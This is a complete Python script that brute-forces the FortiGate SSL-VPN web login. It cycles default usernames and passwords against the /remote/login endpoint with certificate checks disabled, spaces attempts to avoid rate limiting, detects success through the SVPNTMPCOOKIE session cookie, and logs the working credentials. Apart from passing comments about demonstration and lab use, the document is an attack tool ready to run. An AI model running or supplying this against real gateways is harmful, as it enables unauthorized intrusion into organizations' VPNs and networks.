import requests
import time
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings (for self-signed certificates, common in Fortinet setups)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
TARGET_URL = "https://<FortiGate-IP>:<port>/remote/login"  # Replace with your FortiGate IP and port
DELAY = 1  # Seconds between attempts to avoid rate-limiting
OUTPUT_FILE = "login_attempts.log"

# Common usernames and passwords (small list for demonstration; expand as needed)
USERNAMES = ["admin", "user", "guest", "test", "root"]
PASSWORDS = ["admin", "password", "123456", "fortinet", ""]

# Function to log attempts
def log_attempt(username, password, status, message):
    with open(OUTPUT_FILE, "a") as f:
        f.write(f"[{time.ctime()}] Username: {username}, Password: {password}, Status: {status}, Message: {message}\n")

# Function to attempt login
def try_login(username, password):
    try:
        # Form data for POST request
        data = {
            "username": username,
            "password": password,
            "realm": "",  # Adjust if a specific realm is required
            # "magic": ""  # Uncomment and scrape if needed
        }

        # Send POST request (ignore SSL verification for lab environments)
        response = requests.post(TARGET_URL, data=data, verify=False, timeout=5)

        # Check for HTTP 200 and SVPNTMPCOOKIE
        if response.status_code == 200:
            set_cookie = response.headers.get("Set-Cookie", "")
            if "SVPNTMPCOOKIE=" in set_cookie:
                message = f"Success! SVPNTMPCOOKIE found: {set_cookie}"
                print(message)
                log_attempt(username, password, "SUCCESS", message)
                return True
            else:
                message = "HTTP 200 but no SVPNTMPCOOKIE"
                print(message)
                log_attempt(username, password, "FAIL", message)
        else:
            message = f"HTTP {response.status_code}"
            print(message)
            log_attempt(username, password, "FAIL", message)

    except requests.RequestException as e:
        message = f"Error: {str(e)}"
        print(message)
        log_attempt(username, password, "ERROR", message)

    return False

# Main brute-force loop
def main():
    print(f"Starting login attempts on {TARGET_URL}")
    print(f"Logging results to {OUTPUT_FILE}")

    for username in USERNAMES:
        for password in PASSWORDS:
            print(f"Trying Username: {username}, Password: {password}")
            if try_login(username, password):
                print("Stopping on successful login")
                return
            time.sleep(DELAY)  # Delay to avoid rate-limiting

    print("Completed all attempts")

if __name__ == "__main__":
    main()
